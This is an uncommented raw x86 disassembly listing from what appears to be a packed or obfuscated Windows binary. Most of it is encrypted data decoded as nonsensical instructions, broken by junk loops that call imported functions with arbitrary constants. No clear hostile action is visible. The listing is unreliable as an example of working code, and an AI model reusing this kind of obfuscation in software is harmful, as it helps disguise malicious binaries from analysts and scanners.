  40ee0a:	loop   0x40edb9
  40ee0c:	in     al,0x71
  40ee0e:	sbb    DWORD PTR [ecx+0x11],esp
  40ee11:	out    0xd0,al
  40ee13:	aad    0x7
  40ee15:	push   edx
  40ee16:	mov    esp,DWORD PTR [edi+esi*2-0x28]
  40ee1a:	push   ebx
  40ee1b:	(bad)  
  40ee1c:	out    dx,al
  40ee1d:	call   0x82ea7237
  40ee22:	ret    0x6a09
  40ee25:	(bad)  
  40ee26:	push   ss
  40ee27:	jbe    0x40ee39
  40ee29:	fisttp WORD PTR [ecx+0x3034df6d]
  40ee2f:	imul   ebp,esp,0xffffffa3
  40ee32:	mov    ah,0x31
  40ee34:	(bad)  
  40ee35:	arpl   WORD PTR [ebx],bp
  40ee37:	lahf   
  40ee38:	sub    al,0x15
  40ee3a:	outs   dx,DWORD PTR ds:[esi]
  40ee3b:	xor    DWORD PTR [ecx],ebp
  40ee3d:	outs   dx,BYTE PTR ds:[esi]
  40ee3e:	inc    esp
  40ee3f:	enter  0xdd22,0x7f
  40ee43:	sti    
  40ee44:	lea    ebx,[eax-0x69102625]
  40ee4a:	push   edi
  40ee4b:	rol    DWORD PTR [esi],cl
  40ee4d:	test   DWORD PTR [eax-0x7a],esi
  40ee50:	inc    eax
  40ee51:	mov    eax,ds:0x1666efe1
  40ee56:	cmp    edi,DWORD PTR [esi+eax*1+0x28378cb8]
  40ee5d:	jp     0x40ee74
  40ee5f:	dec    eax
  40ee60:	ss das 
  40ee62:	stos   BYTE PTR es:[edi],al
  40ee63:	jae    0x40ee00
  40ee65:	fidiv  WORD PTR [edi+0x54]
  40ee68:	mov    cl,0xe4
  40ee6a:	in     al,0xc2
  40ee6c:	arpl   WORD PTR ds:0x24820c09,ax
  40ee72:	adc    DWORD PTR [edi-0x75],ecx
  40ee75:	popf   
  40ee76:	pop    esp
  40ee77:	out    dx,al
  40ee78:	sub    ecx,DWORD PTR [edi-0x6c5e799]
  40ee7e:	sbb    DWORD PTR [edi-0x6f],esi
  40ee81:	dec    eax
  40ee82:	rcr    DWORD PTR [eax],0xb9
  40ee85:	pop    esp
  40ee86:	inc    edi
  40ee87:	push   ecx
  40ee88:	cmc    
  40ee89:	mov    eax,ds:0xa11c6d0a
  40ee8e:	ins    DWORD PTR es:[edi],dx
  40ee8f:	push   ebx
  40ee90:	cmp    DWORD PTR [edi],eax
  40ee92:	nop
  40ee93:	neg    BYTE PTR [ebx+0x394ea55d]
  40ee99:	xor    BYTE PTR [esi-0x68fa2403],dl
  40ee9f:	xchg   ebx,eax
  40eea0:	xor    DWORD PTR [edx+0x3c],edi
  40eea3:	mov    edi,0xf44ae686
  40eea8:	add    BYTE PTR [edi+0x3],ch
  40eeab:	aaa    
  40eeac:	(bad)  
  40eeae:	jle    0x40eea8
  40eeb0:	mov    dl,0xa8
  40eeb2:	int    0x49
  40eeb4:	inc    eax
  40eeb5:	and    BYTE PTR [ebx],bl
  40eeb7:	jle    0x40ee9a
  40eeb9:	mov    cl,0x9c
  40eebb:	sbb    al,0x1e
  40eebd:	add    DWORD PTR [edx],ebx
  40eebf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eec0:	enter  0xcd8e,0x6f
  40eec4:	call   0xf8e3ee5
  40eec9:	js     0x40eed1
  40eecb:	xlat   BYTE PTR ds:[ebx]
  40eecc:	jl     0x40eefe
  40eece:	shl    ah,1
  40eed0:	mov    ds:0xa8a4a736,eax
  40eed5:	int3   
  40eed6:	push   0x36
  40eed8:	jns    0x40ef57
  40eeda:	xor    eax,0x56bad7a6
  40eedf:	ss dec eax
  40eee1:	jmp    FWORD PTR [eax+0x3bb0284a]
  40eee7:	lahf   
  40eee8:	mov    dl,0x16
  40eeea:	(bad)  
  40eeec:	adc    ch,ah
  40eeee:	inc    esp
  40eeef:	fnstcw WORD PTR [edi-0x73cb3b67]
  40eef5:	dec    esp
  40eef6:	outs   dx,BYTE PTR ds:[esi]
  40eef7:	or     DWORD PTR [ecx],edx
  40eef9:	ret    0x5946
  40eefc:	outs   dx,BYTE PTR ds:[esi]
  40eefd:	test   al,0x6a
  40eeff:	mov    ds:0xcc540998,al
  40ef04:	mov    eax,ds:0x9cc8c6b8
  40ef09:	(bad)
  40ef0d:	int3   
  40ef0e:	xchg   ecx,eax
  40ef0f:	cmp    eax,0x3656972f
  40ef14:	js     0x40ef31
  40ef16:	ja     0x40eecb
  40ef18:	add    bh,0x49
  40ef1b:	pop    esi
  40ef1c:	inc    eax
  40ef1d:	add    BYTE PTR [ecx+ebx*1],0xb3
  40ef21:	outs   dx,DWORD PTR ds:[esi]
  40ef22:	mov    ah,0xbe
  40ef24:	cmp    BYTE PTR [ebx+0x66],ch
  40ef27:	shufps xmm7,XMMWORD PTR [ebp-0x7b55bfe8],0xf5
  40ef2f:	fdiv   DWORD PTR [esi]
  40ef31:	enter  0x119f,0x5
  40ef35:	mov    esi,0xd088a976
  40ef3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef3b:	sbb    al,0x12
  40ef3d:	fcmove st,st(0)
  40ef3f:	inc    edx
  40ef40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef41:	arpl   WORD PTR [esi+0x1b99500e],bp
  40ef47:	mov    WORD PTR [ebx+0x7cd0b600],es
  40ef4d:	adc    al,0x0
  40ef4f:	mov    WORD PTR [eax],fs
  40ef51:	pushf  
  40ef52:	and    BYTE PTR [edi],0x6c
  40ef55:	mov    dl,BYTE PTR [edi-0x12e7b0b2]
  40ef5b:	jns    0x40ef60
  40ef5d:	push   ecx
  40ef5e:	xor    eax,0x418f8f7e
  40ef63:	repnz mov dl,dl
  40ef66:	das    
  40ef67:	icebp  
  40ef68:	sar    DWORD PTR [eax+esi*2+0x6c],cl
  40ef6c:	cmp    ch,ch
  40ef6e:	mov    ah,0x38
  40ef70:	je     0x40efd7
  40ef72:	sbb    cl,ah
  40ef74:	fcmovb st,st(2)
  40ef76:	leave  
  40ef77:	jae    0x40ef0e
  40ef79:	or     al,BYTE PTR [esi+0x204fcd0d]
  40ef7f:	mov    bl,0x77
  40ef81:	es dec eax
  40ef83:	(bad)  
  40ef84:	jmp    0x4624d74e
  40ef89:	fidivr DWORD PTR [eax-0x5f]
  40ef8c:	mov    bh,0xf4
  40ef8e:	scas   al,BYTE PTR es:[edi]
  40ef8f:	outs   dx,DWORD PTR ds:[esi]
  40ef90:	loop   0x40ef86
  40ef92:	xchg   esi,eax
  40ef93:	jmp    0xf3c909a3
  40ef98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef99:	out    0x19,al
  40ef9b:	xor    al,0xf0
  40ef9d:	xchg   ebp,eax
  40ef9e:	ja     0x40ef5c
  40efa0:	push   esi
  40efa1:	das    
  40efa2:	rcr    BYTE PTR [ebx+edx*8+0xadfdead],0xc6
  40efaa:	in     al,0x5b
  40efac:	not    DWORD PTR [ebx+eiz*4]
  40efaf:	push   es
  40efb0:	inc    edi
  40efb1:	dec    eax
  40efb2:	xchg   BYTE PTR [ecx+0x3b],cl
  40efb5:	and    DWORD PTR [eax+0x62],edx
  40efb8:	cwde   
  40efb9:	je     0x40ef7f
  40efbb:	adc    BYTE PTR [ebp+0x66b7620],bh
  40efc1:	mov    bh,0xd3
  40efc3:	int3   
  40efc4:	add    bl,BYTE PTR [ebx-0x6d601252]
  40efca:	clc    
  40efcb:	sbb    eax,0x55f5cb8e
  40efd0:	repz fistp DWORD PTR [eax]
  40efd3:	rol    bl,1
  40efd5:	addr16 data16 jbe 0x40efce
  40efd9:	or     cl,BYTE PTR [esi-0x22]
  40efdc:	mov    cs,WORD PTR [eax+0x26c80e7]
  40efe2:	je     0x40f05b
  40efe4:	jmp    FWORD PTR [ebp+0x1b]
  40efe7:	push   eax
  40efe9:	push   ds
  40efea:	dec    edi
  40efeb:	xchg   DWORD PTR [edx+0x5b17ada],ebp
  40eff1:	and    ecx,0xbb6668f4
  40eff7:	imul   esp,edx,0x4f
  40effa:	in     al,dx
  40effb:	and    BYTE PTR [esi],0x9f
  40effe:	(bad)  
  40efff:	xor    edi,DWORD PTR ds:0x451126
  40f005:	adc    DWORD PTR [ecx+ebp*1],edx
  40f008:	(bad)  
  40f009:	jbe    0x40f057
  40f00b:	pop    DWORD PTR [ebx-0x51aa2042]
  40f011:	test   eax,0x5c6221b1
  40f016:	mov    DWORD PTR [ebp-0x8],edx
  40f019:	and    DWORD PTR ds:0x42a821,0x0
  40f023:	xor    edi,edi
  40f025:	add    edi,DWORD PTR ds:0x42a821
  40f02b:	inc    edi
  40f02c:	mov    DWORD PTR ds:0x42a821,edi
  40f032:	cmp    DWORD PTR ds:0x42a821,0xa
  40f039:	jne    0x40f04a
  40f03f:	push   0x23fa
  40f044:	call   DWORD PTR ds:0x41d0d0
  40f04a:	cmp    DWORD PTR ds:0x42a821,0x9
  40f051:	jne    0x40f066
  40f057:	xor    edi,edi
  40f059:	or     edi,DWORD PTR ds:0x42a821
  40f05f:	inc    edi
  40f060:	mov    DWORD PTR ds:0x42a821,edi
  40f066:	cmp    DWORD PTR ds:0x42a821,0x10
  40f06d:	jb     0x40f023
  40f073:	and    edi,edi
  40f075:	mov    edx,DWORD PTR [ebp+0x8]
  40f078:	and    DWORD PTR ds:0x42a8ad,0x0
  40f082:	mov    edi,DWORD PTR ds:0x42a8ad
  40f088:	inc    edi
  40f089:	mov    DWORD PTR ds:0x42a8ad,edi
  40f08f:	cmp    DWORD PTR ds:0x42a8ad,0x29
  40f096:	jne    0x40f0ac
  40f09c:	push   0x42a825
  40f0a1:	push   0x4a20
  40f0a6:	call   DWORD PTR ds:0x41d0d4
  40f0ac:	cmp    DWORD PTR ds:0x42a8ad,0x1f
  40f0b3:	jb     0x40f082
  40f0b9:	and    DWORD PTR ds:0x42a779,0x6b84
  40f0c3:	xor    edx,eax
  40f0c5:	jmp    0x40f34d
  40f0ca:	enter  0xcbc4,0xc2
  40f0ce:	fcmovnb st,st(1)
  40f0d0:	aad    0xda
  40f0d2:	push   cs
  40f0d3:	and    al,0x97
  40f0d5:	cmp    al,0x1
  40f0d7:	out    dx,eax
  40f0d8:	mov    ebp,DWORD PTR [esi+ecx*8-0x44]
  40f0dc:	js     0x40f156
  40f0de:	in     eax,0x7e
  40f0e0:	js     0x40f15a
  40f0e2:	into   
  40f0e3:	mov    ah,0xd9
  40f0e5:	ins    DWORD PTR es:[edi],dx
  40f0e6:	fwait
  40f0e7:	stos   BYTE PTR es:[edi],al
  40f0e8:	and    eax,0x886d7f20
  40f0ed:	ret    
  40f0ee:	pop    ebx
  40f0ef:	xor    BYTE PTR [edx+0x1d],ah
  40f0f2:	xor    al,0x54
  40f0f4:	sub    ebp,DWORD PTR [ebp+0x63]
  40f0f7:	pop    esi
  40f0f8:	dec    ebx
  40f0f9:	call   0x47da:0xe479ed5
  40f100:	cld    
  40f101:	xchg   esi,eax
  40f102:	sub    esi,esi
  40f104:	sbb    BYTE PTR [ecx+0x6e],dh
  40f107:	adc    bl,BYTE PTR [ebp+0x3e23687e]
  40f10d:	enter  0x8613,0xf6
  40f111:	dec    ecx
  40f112:	je     0x40f0e2
  40f114:	adc    BYTE PTR [eax],cl
  40f116:	push   es
  40f117:	and    DWORD PTR [esi-0x23],esp
  40f11a:	test   DWORD PTR [ebp+0x40],esi
  40f11d:	sub    al,dl
  40f11f:	and    BYTE PTR ds:0xc225254,dl
  40f125:	mov    ds:0xd5cfbd5d,eax
  40f12a:	jle    0x40f0be
  40f12c:	inc    ebp
  40f12d:	sbb    eax,0x2c1e31bd
  40f132:	aam    0xd2
  40f134:	shl    BYTE PTR [ecx-0x13],cl
  40f137:	cli    
  40f138:	push   esi
  40f139:	pusha  
  40f13a:	sbb    eax,0xca84ba38
  40f13f:	cld    
  40f140:	push   ds
  40f141:	mov    ebx,0x6d5be386
  40f146:	sahf   
  40f147:	inc    esi
  40f148:	leave  
  40f149:	frstpm(287 only) 
  40f14b:	lahf   
  40f14c:	sbb    al,0x3e
  40f14e:	fnstcw WORD PTR [edi-0x53ad80af]
  40f154:	jae    0x40f182
  40f156:	jne    0x40f184
  40f158:	loopne 0x40f17c
  40f15a:	popa   
  40f15b:	mov    dl,0xc5
  40f15d:	scas   eax,DWORD PTR es:[edi]
  40f15e:	(bad)  
  40f15f:	jmp    0x40f1ad
  40f161:	popf   
  40f162:	mov    bl,0xf0
  40f164:	aam    0x89
  40f166:	nop
  40f167:	ss adc ah,0x16
  40f16b:	scas   eax,DWORD PTR es:[edi]
  40f16c:	cmp    ebx,0x666f3
  40f172:	test   al,0x2f
  40f174:	mov    ebx,0x6db6a2c5
  40f179:	jg     0x40f1f0
  40f17b:	mov    edx,DWORD PTR [esi]
  40f17d:	test   eax,0xe2d8b1ca
  40f182:	call   0x94e16b4b
  40f187:	push   ecx
  40f188:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f189:	inc    esp
  40f18a:	lock dec ecx
  40f18c:	sub    bl,BYTE PTR [eax-0x7dd1a325]
  40f192:	jb     0x40f161
  40f194:	in     eax,dx
  40f195:	enter  0x575d,0x37
  40f199:	(bad)  
  40f19a:	mov    cl,0xc1
  40f19c:	jne    0x40f1d3
  40f19e:	mov    al,ds:0x55b76701
  40f1a3:	add    esi,DWORD PTR [ebp-0xb6a4a11]
  40f1a9:	adc    edi,DWORD PTR [edi+0x26]
  40f1ac:	imul   ebx,ebx,0xffffff87
  40f1af:	dec    ebx
  40f1b0:	adc    al,0x50
  40f1b2:	sahf   
  40f1b3:	nop
  40f1b4:	cli    
  40f1b5:	shl    BYTE PTR [ecx+0xd],cl
  40f1b8:	mov    al,0xdb
  40f1ba:	mov    esp,0xba834fbf
  40f1bf:	sub    BYTE PTR [ecx-0x3],dh
  40f1c2:	mov    bl,0x0
  40f1c4:	jle    0x40f166
  40f1c6:	call   DWORD PTR [ebx]
  40f1c8:	cmp    BYTE PTR [edi],bl
  40f1ca:	retf   
  40f1cb:	inc    esp
  40f1cc:	mov    fs,WORD PTR [esi]
  40f1ce:	jl     0x40f1b0
  40f1d0:	add    ch,ch
  40f1d2:	or     BYTE PTR [ebx-0x6c],dh
  40f1d5:	into   
  40f1d6:	mov    edx,0x68ce6e6d
  40f1db:	pusha  
  40f1dc:	ret    0x2008
  40f1df:	xor    eax,0xa4362b49
  40f1e4:	ror    BYTE PTR [ecx],1
  40f1e6:	arpl   WORD PTR [ebp-0x255a9315],cx
  40f1ec:	inc    esi
  40f1ed:	cmp    eax,0x6c84c6
  40f1f2:	stos   DWORD PTR es:[edi],eax
  40f1f3:	(bad)  
  40f1f5:	in     eax,dx
  40f1f6:	jns    0x40f1c4
  40f1f8:	call   0x681ab08c
  40f1fd:	pmaddwd mm2,mm3
  40f200:	stos   BYTE PTR es:[edi],al
  40f201:	jnp    0x40f1e9
  40f203:	mov    ebx,0x853aec8e
  40f208:	cld    
  40f209:	aam    0x36
  40f20b:	and    bh,BYTE PTR [ecx+0x27f312f8]
  40f211:	mov    al,0xd6
  40f213:	or     DWORD PTR [ecx],ebx
  40f215:	lock (bad) 
  40f217:	stos   DWORD PTR es:[edi],eax
  40f218:	push   ebx
  40f219:	lds    eax,FWORD PTR [eax+eiz*1+0x42cf14b9]
  40f220:	int3   
  40f221:	in     al,0x3
  40f223:	inc    ebp
  40f224:	xchg   ecx,eax
  40f225:	(bad)  
  40f226:	mov    ebx,0x86d36a21
  40f22b:	mov    ss,WORD PTR [edx]
  40f22d:	ret    0x7ae2
  40f230:	sbb    esp,DWORD PTR [edi+ecx*8-0x21344f26]
  40f237:	xor    esi,esp
  40f239:	sub    DWORD PTR [esi*8-0x3e69f689],esp
  40f240:	loopne 0x40f260
  40f242:	out    dx,al
  40f243:	xchg   ecx,eax
  40f244:	cli    
  40f245:	mov    eax,0xfb10b290
  40f24a:	jmp    0x40f286
  40f24c:	jnp    0x40f216
  40f24e:	packsswb mm5,QWORD PTR [edx-0x7036b9da]
  40f255:	inc    edx
  40f256:	fild   WORD PTR [ebx+0x72]
  40f259:	cmp    BYTE PTR [ecx-0x6408104],0xdf
  40f260:	add    eax,0xee44a285
  40f265:	jge    0x40f29b
  40f267:	jbe    0x40f200
  40f269:	(bad)  
  40f26a:	xor    al,0x97
  40f26c:	or     eax,0xc7731cff
  40f271:	fdiv   QWORD PTR [edx+0x2f]
  40f274:	xlat   BYTE PTR ds:[ebx]
  40f275:	cmp    BYTE PTR [edx-0x38],0x2e
  40f279:	aas    
  40f27a:	jb     0x40f260
  40f27c:	sub    edi,DWORD PTR [edx]
  40f27e:	test   DWORD PTR [ecx],ecx
  40f280:	stc    
  40f281:	cwde   
  40f282:	aaa    
  40f283:	popa   
  40f284:	push   cs
  40f285:	mov    cl,0x62
  40f287:	repz retf 0xbf9e
  40f28b:	std    
  40f28c:	xor    DWORD PTR es:[eax],ebp
  40f28f:	xor    ah,BYTE PTR [edi+eax*1]
  40f292:	jbe    0x40f283
  40f294:	jns    0x40f262
  40f296:	push   es
  40f297:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f298:	mov    bl,0x2
  40f29a:	call   0xe3d7:0xb2ccdb56
  40f2a1:	xor    al,0x8f
  40f2a3:	pushf  
  40f2a4:	push   cs
  40f2a5:	sub    al,0x38
  40f2a7:	jecxz  0x40f2a8
  40f2a9:	cmp    al,0x59
  40f2ab:	and    esp,0xffffff83
  40f2ae:	sub    al,cl
  40f2b0:	cmp    DWORD PTR [edx-0xb],esi
  40f2b3:	add    eax,0x24f7a55b
  40f2b8:	jae    0x40f27d
  40f2ba:	into   
  40f2bb:	test   BYTE PTR [edi],0x9c
  40f2be:	fwait
  40f2bf:	(bad)  
  40f2c0:	jg     0x40f265
  40f2c2:	jbe    0x40f257
  40f2c4:	ins    DWORD PTR es:[edi],dx
  40f2c5:	outs   dx,DWORD PTR ds:[esi]
  40f2c6:	inc    esi
  40f2c7:	sub    eax,eax
  40f2c9:	sub    DWORD PTR [esi],esp
  40f2cb:	out    0xec,al
  40f2cd:	sub    DWORD PTR [eax],ecx
  40f2cf:	pop    eax
  40f2d0:	je     0x40f29c
  40f2d2:	jb     0x40f29a
  40f2d4:	and    BYTE PTR [edx+ebx*8-0x71707d1],ah
  40f2db:	sub    BYTE PTR [esi],bh
  40f2dd:	xchg   ebx,eax
  40f2de:	mov    ebx,0x46e796c5
  40f2e3:	ss leave 
  40f2e5:	inc    ebp
  40f2e6:	ins    DWORD PTR es:[edi],dx
  40f2e7:	jp     0x40f26d
  40f2e9:	cmp    ebp,ebp
  40f2eb:	lods   al,BYTE PTR ds:[esi]
  40f2ec:	pop    ebx
  40f2ed:	push   0x61
  40f2ef:	sbb    DWORD PTR [esi-0xf38c638],edx
  40f2f5:	add    DWORD PTR [esi-0x5f],edx
  40f2f8:	and    bh,BYTE PTR [esi]
  40f2fa:	push   ds
  40f2fb:	in     eax,dx
  40f2fc:	inc    ecx
  40f2fd:	pop    ecx
  40f2fe:	(bad)  
  40f2ff:	mov    edi,0xf6b52573
  40f304:	adc    DWORD PTR [ecx-0x49],0x3c465127
  40f30b:	cdq    
  40f30c:	aam    0x84
  40f30e:	jbe    0x40f353
  40f310:	imul   esi,ebx,0xffffffee
  40f313:	inc    ecx
  40f314:	xor    al,0xc9
  40f316:	push   es
  40f317:	bound  eax,QWORD PTR [ecx-0x2d]
  40f31a:	mov    ds:0xd7acc599,al
  40f31f:	cmp    eax,0xa1d825f8
  40f324:	imul   eax,DWORD PTR [ebp-0x5bbed0a],0xdf157ea4
  40f32e:	shl    DWORD PTR [eax+0x59],0xe1
  40f332:	fimul  DWORD PTR [edi+0xc2c3084]
  40f338:	sbb    ah,dl
  40f33a:	mov    ch,0x9e
  40f33c:	jmp    0xbf20:0x6ebd7243
  40f343:	pop    ebx
  40f344:	hlt    
  40f345:	js     0x40f3bd
  40f347:	test   al,0x40
  40f349:	mov    ecx,0x3b85f93
  40f34e:	rol    edi,1
  40f350:	add    eax,0x42a82d
  40f355:	sbb    eax,0x83000000
  40f35a:	cmp    eax,0x42a82d
  40f35f:	add    BYTE PTR [edi],cl
  40f361:	test   BYTE PTR [ebp+0x0],bl
  40f364:	add    BYTE PTR [eax],al
  40f366:	cmp    DWORD PTR ds:0x42a82d,0x7
  40f36d:	jne    0x40f389
  40f373:	push   DWORD PTR [ebp-0x20]
  40f376:	push   DWORD PTR [ebp-0x14]
  40f379:	push   0x7b1d
  40f37e:	push   0x2bb5
  40f383:	call   DWORD PTR ds:0x41d258
  40f389:	cmp    DWORD PTR ds:0x42a82d,0x8
  40f390:	jne    0x40f3a3
  40f396:	mov    edi,DWORD PTR ds:0x42a82d
  40f39c:	dec    edi
  40f39d:	mov    DWORD PTR ds:0x42a82d,edi
  40f3a3:	mov    edi,DWORD PTR ds:0x42a82d
  40f3a9:	dec    edi
  40f3aa:	mov    DWORD PTR ds:0x42a82d,edi
  40f3b0:	jmp    0x40f359
  40f3b5:	xor    edi,edi
  40f3b7:	add    edi,DWORD PTR ds:0x42a779
  40f3bd:	add    DWORD PTR ds:0x42a795,edi
  40f3c3:	mov    DWORD PTR [ebp+0xc],edx
  40f3c6:	xor    edx,DWORD PTR ds:0x42a789
  40f3cc:	mov    DWORD PTR [ebp-0x4],0xf89c85d8
  40f3d3:	or     edx,edx
  40f3d5:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  40f3dc:	and    DWORD PTR ds:0x42a861,0x0
  40f3e6:	jmp    0x40f3f8
  40f3eb:	mov    edx,DWORD PTR ds:0x42a861
  40f3f1:	inc    edx
  40f3f2:	mov    DWORD PTR ds:0x42a861,edx
  40f3f8:	cmp    DWORD PTR ds:0x42a861,0x12
  40f3ff:	jae    0x40f427
  40f405:	cmp    DWORD PTR ds:0x42a861,0x14
  40f40c:	jne    0x40f420
  40f412:	push   0x4578
  40f417:	push   DWORD PTR [ebp-0x14]
  40f41a:	call   DWORD PTR ds:0x41d25c
  40f420:	jmp    0x40f3eb
  40f425:	and    edi,edi
  40f427:	mov    DWORD PTR [ebp-0x2c],0xf89c853b
  40f42e:	sub    edi,DWORD PTR ds:0x42a899
  40f434:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  40f43b:	and    edi,0x6695
  40f441:	mov    DWORD PTR [ebp-0x34],0xf89c853d
  40f448:	or     DWORD PTR ds:0x42a795,0x61f4
  40f452:	mov    DWORD PTR [ebp-0x38],0xf89c853e
  40f459:	and    DWORD PTR ds:0x42a829,0x0
  40f463:	jmp    0x40f477
  40f468:	xor    edx,edx
  40f46a:	xor    edx,DWORD PTR ds:0x42a829
  40f470:	inc    edx
  40f471:	mov    DWORD PTR ds:0x42a829,edx
  40f477:	cmp    DWORD PTR ds:0x42a829,0x11
  40f47e:	jae    0x40f4ac
  40f484:	cmp    DWORD PTR ds:0x42a829,0x1a
  40f48b:	jne    0x40f4a7
  40f491:	push   0x1
  40f493:	push   DWORD PTR [ebp-0xc]
  40f496:	push   DWORD PTR [ebp-0x20]
  40f499:	push   0x1352
  40f49e:	push   DWORD PTR [ebp-0x18]
  40f4a1:	call   DWORD PTR ds:0x41d0d8
  40f4a7:	jmp    0x40f468
  40f4ac:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40f4b3:	mov    edx,DWORD PTR [ebp+0x8]
  40f4b6:	xor    edx,eax
  40f4b8:	mov    DWORD PTR ds:0x42a7e9,0x16
  40f4c2:	cmp    DWORD PTR ds:0x42a7e9,0x0
  40f4c9:	je     0x40f553
  40f4cf:	cmp    DWORD PTR ds:0x42a7e9,0x21
  40f4d6:	jne    0x40f4f6
  40f4dc:	push   0x6e96
  40f4e1:	push   0x4a9d
  40f4e6:	push   0x2037
  40f4eb:	push   0x3f81
  40f4f0:	call   DWORD PTR ds:0x41d0dc
  40f4f6:	xor    edi,edi
  40f4f8:	or     edi,DWORD PTR ds:0x42a7e9
  40f4fe:	dec    edi
  40f4ff:	mov    DWORD PTR ds:0x42a7e9,edi
  40f505:	jmp    0x40f4c2
  40f50a:	and    DWORD PTR ds:0x42a861,0x0
  40f514:	jmp    0x40f528
  40f519:	xor    edi,edi
  40f51b:	or     edi,DWORD PTR ds:0x42a861
  40f521:	inc    edi
  40f522:	mov    DWORD PTR ds:0x42a861,edi
  40f528:	cmp    DWORD PTR ds:0x42a861,0x1e
  40f52f:	jae    0x40f553
  40f535:	cmp    DWORD PTR ds:0x42a861,0x26
  40f53c:	jne    0x40f548
  40f542:	call   DWORD PTR ds:0x41d0e0
  40f548:	jmp    0x40f519
  40f54d:	dec    DWORD PTR ds:0x42a7ed
  40f553:	mov    edi,DWORD PTR [ebp-0x10]
  40f556:	mov    DWORD PTR ds:0x42a851,0x29a7
  40f560:	jmp    0x40f7e8
  40f565:	(bad)
  40f568:	ret    0xc2d9
  40f56b:	(bad)  
  40f56d:	sar    DWORD PTR [edi],0x6b
  40f570:	sar    DWORD PTR [esi],0x62
  40f573:	adc    al,0xdf
  40f575:	mov    ebx,0xe5787842
  40f57a:	jle    0x40f5f4
  40f57c:	js     0x40f51d
  40f57e:	pop    ebp
  40f57f:	jecxz  0x40f5ea
  40f581:	or     cl,cl
  40f583:	fsubr  QWORD PTR [ebx]
  40f585:	aam    0xc2
  40f587:	mov    ?,WORD PTR [edi]
  40f589:	sbb    al,0x6a
  40f58b:	push   esp
  40f58c:	and    bl,BYTE PTR [esi+0xe3a0574]
  40f592:	ja     0x40f57b
  40f594:	aaa    
  40f595:	jle    0x40f526
  40f597:	out    dx,eax
  40f598:	out    dx,eax
  40f599:	push   ds
  40f59a:	mov    ebx,ecx
  40f59c:	mov    ah,0xd0
  40f59e:	dec    ebp
  40f59f:	or     BYTE PTR [ebx],dh
  40f5a1:	(bad)  
  40f5a2:	mov    ebx,0xd0105928
  40f5a7:	mov    ah,0xff
  40f5a9:	pop    ebx
  40f5aa:	test   DWORD PTR [ebx+0x49f62b4a],eax
  40f5b0:	sub    al,bl
  40f5b2:	add    eax,0x9a709059
  40f5b7:	scas   al,BYTE PTR es:[edi]
  40f5b8:	adc    edx,DWORD PTR [esi-0x73fd396e]
  40f5be:	push   ds
  40f5bf:	ret    
  40f5c0:	or     al,0x2b
  40f5c2:	and    edi,DWORD PTR [ecx]
  40f5c4:	ja     0x40f5bb
  40f5c6:	xchg   ebx,eax
  40f5c7:	xor    eax,0x853cdfe5
  40f5cc:	dec    edx
  40f5cd:	daa    
  40f5ce:	cmp    BYTE PTR [esi-0x7e],0x16
  40f5d2:	dec    edx
  40f5d3:	mov    bl,0xf1
  40f5d5:	retf   
  40f5d6:	loopne 0x40f64b
  40f5d8:	inc    esi
  40f5d9:	adc    DWORD PTR [edx+0x6738b668],esi
  40f5df:	scas   al,BYTE PTR es:[edi]
  40f5e0:	mov    ah,0x65
  40f5e2:	mov    bl,0x7
  40f5e4:	mov    ds:0x63d11bd5,al
  40f5e9:	sahf   
  40f5ea:	dec    edx
  40f5eb:	inc    eax
  40f5ec:	push   ebx
  40f5ed:	rcl    DWORD PTR [ebp+0x6b],0xb3
  40f5f1:	jmp    0x40f62a
  40f5f3:	div    ebx
  40f5f5:	retf   0x9066
  40f5f8:	push   ecx
  40f5f9:	test   eax,0x863d9dec
  40f5fe:	test   al,0xb4
  40f600:	test   esp,edi
  40f602:	jge    0x40f668
  40f604:	(bad)  
  40f605:	sub    ax,0x3377
  40f609:	xlat   BYTE PTR ds:[ebx]
  40f60a:	sbb    ah,BYTE PTR [ebx]
  40f60c:	pop    ss
  40f60d:	jo     0x40f66c
  40f60f:	push   ebp
  40f610:	jnp    0x40f647
  40f612:	mov    BYTE PTR [eax-0x5],dh
  40f615:	push   ebx
  40f616:	cmp    BYTE PTR [esi],ah
  40f618:	ins    BYTE PTR es:[edi],dx
  40f619:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f61a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f61b:	jb     0x40f616
  40f61d:	adc    ebx,DWORD PTR [ecx-0x49253669]
  40f623:	ins    BYTE PTR es:[edi],dx
  40f624:	leave  
  40f625:	addr16 daa 
  40f627:	xchg   ebx,eax
  40f628:	test   ah,bh
  40f62a:	inc    esp
  40f62b:	repz pop ebp
  40f62d:	cmp    dl,bl
  40f62f:	arpl   WORD PTR [edx-0x703c20a3],bp
  40f635:	inc    esp
  40f636:	loope  0x40f5c2
  40f638:	push   0x5abf3b2f
  40f63d:	popf   
  40f63e:	xchg   esp,eax
  40f63f:	je     0x40f5eb
  40f641:	add    DWORD PTR [ebx-0xebcd080],ebp
  40f647:	test   BYTE PTR [esi],cl
  40f649:	div    DWORD PTR [edx-0x3f]
  40f64c:	mov    BYTE PTR [edx+ecx*2+0x31],bl
  40f650:	mov    esi,DWORD PTR [edx-0x4fadff7d]
  40f656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f657:	xchg   esi,eax
  40f658:	aaa    
  40f659:	sbb    al,0xa2
  40f65b:	sub    eax,0xae914087
  40f660:	cmp    DWORD PTR [eax-0x7e04219c],0x80898a5c
  40f66a:	xchg   ebp,eax
  40f66b:	push   ebx
  40f66c:	dec    ecx
  40f66d:	imul   edx,DWORD PTR [edx+0x2c69bcd2],0x32
  40f674:	test   DWORD PTR [eax+0x735fae1d],ebp
  40f67a:	mov    al,ds:0xc85cb158
  40f67f:	jns    0x40f64b
  40f681:	clc    
  40f682:	jge    0x40f67b
  40f684:	fsubr  DWORD PTR [ecx-0x2b]
  40f687:	xchg   ebp,eax
  40f688:	and    eax,0x17c77618
  40f68d:	pusha  
  40f68e:	mov    ?,WORD PTR [edx+eiz*2]
  40f691:	sub    eax,DWORD PTR ss:[ebx]
  40f694:	inc    edx
  40f695:	dec    ebp
  40f696:	sar    cl,0xd9
